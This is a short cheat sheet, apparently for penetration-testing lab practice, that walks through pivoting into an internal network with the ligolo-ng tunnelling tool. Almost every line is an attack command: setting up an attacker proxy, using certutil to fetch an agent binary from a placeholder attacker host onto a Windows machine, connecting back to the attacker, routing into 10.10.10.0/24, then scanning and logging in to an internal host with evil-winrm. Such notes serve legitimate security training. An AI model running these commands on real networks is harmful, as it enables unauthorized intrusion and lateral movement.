```
# 1. Attacker: create tun interface + start proxy:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. Transfer agent to MS01 → connect:
# Windows:
certutil -urlcache -split -f http://<LHOST>/agent.exe agent.exe
.\agent.exe -connect <LHOST>:11601 -ignore-cert

# 3. In ligolo proxy console:
session; ifconfig; start

# 4. Add route to internal network:
sudo ip route add 10.10.10.0/24 dev ligolo
# Now attack MS02 directly!
nmap -sV 10.10.10.50
evil-winrm -i 10.10.10.50 -u user -p pass

# Expose internal port via listener:
listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
```